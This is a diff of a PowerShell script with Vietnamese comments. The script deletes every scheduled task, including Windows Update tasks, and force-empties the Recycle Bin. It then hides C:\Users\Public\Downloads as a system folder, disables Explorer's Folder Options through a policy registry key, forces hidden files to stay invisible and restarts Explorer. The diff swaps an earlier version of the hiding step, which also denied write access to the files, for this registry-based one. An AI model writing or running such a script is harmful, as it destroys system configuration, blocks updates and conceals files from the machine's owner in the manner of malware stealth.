@@ -72,20 +72,12 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsU
 Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
 Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
 Clear-RecycleBin -Force
-# ==== THIẾT LẬP ====
-$targetPath = "C:\Users\Public\Downloads"   # 🔁 Thay bằng thư mục của bạn
-
-# ==== 1. ẨN THƯ MỤC ====
-(Get-Item $targetPath).Attributes += 'Hidden','System'
-
-# ==== 2. ẨN FILES VÀ CHẶN GHI ====
-Get-ChildItem $targetPath -Recurse -File | ForEach-Object {
-    # Ẩn file dưới dạng hệ thống
-    (Get-Item $_.FullName).Attributes += 'Hidden','System'
-
-    # Chặn ghi (nhưng vẫn cho chạy)
-    icacls $_.FullName /inheritance:r /grant:r "Everyone:RX" /deny "Everyone:W" | Out-Null
-}
-
-Write-Host "✅ Success"
+attrib +h +s "C:\Users\Public\Downloads"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
+-Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
+-Name "Hidden" -PropertyType DWORD -Value 2 -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
+-Name "Hidden" -Value 2
+Stop-Process -Name explorer -Force
 exit
